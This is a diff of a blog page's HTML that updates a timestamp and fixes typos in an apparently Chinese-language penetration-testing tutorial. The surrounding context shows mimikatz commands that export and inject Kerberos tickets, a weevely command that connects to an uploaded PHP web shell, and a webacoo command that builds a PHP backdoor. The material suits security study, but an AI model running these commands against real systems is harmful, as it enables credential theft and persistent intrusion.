@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://kizureina.github.io/images/image-20240611195945053.png">
 <meta property="og:image" content="https://kizureina.github.io/images/image-20240611200048921.png">
 <meta property="article:published_time" content="2024-06-11T06:53:04.000Z">
-<meta property="article:modified_time" content="2024-06-11T14:06:40.185Z">
+<meta property="article:modified_time" content="2024-06-12T01:36:03.822Z">
 <meta property="article:author" content="Kizurena">
 <meta property="article:tag" content="Web Computer Science Anime Comic Galgame">
 <meta name="twitter:card" content="summary">
@@ -586,7 +586,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> </span><br></pre></td></tr></table></figure>
 
 <p>清除内存中的票据：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos ::purge </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge </span><br></pre></td></tr></table></figure>
 
 <p>将票据注入内存：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;kerberos::ptt &lt;票据文件名&gt;&quot;</span></span><br></pre></td></tr></table></figure>
@@ -877,7 +877,7 @@
 <p>将生成的.php文件上传到目标机器，并且能通过外网访问到文件，此时可以连接WebShell:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely &lt;目标url,以文件名结尾&gt; &lt;密码&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="weabacoo后门"><a href="#weabacoo后门" class="headerlink" title="weabacoo后门"></a>weabacoo后门</h3><p>也是针对PHP平台的Web后门工具。 </p>
+<h3 id="webacoo后门"><a href="#webacoo后门" class="headerlink" title="webacoo后门"></a>webacoo后门</h3><p>也是针对PHP平台的Web后门工具。 </p>
 <p>制作后门工具: </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -g -o &lt;生成文件路径&gt; </span><br></pre></td></tr></table></figure>
 
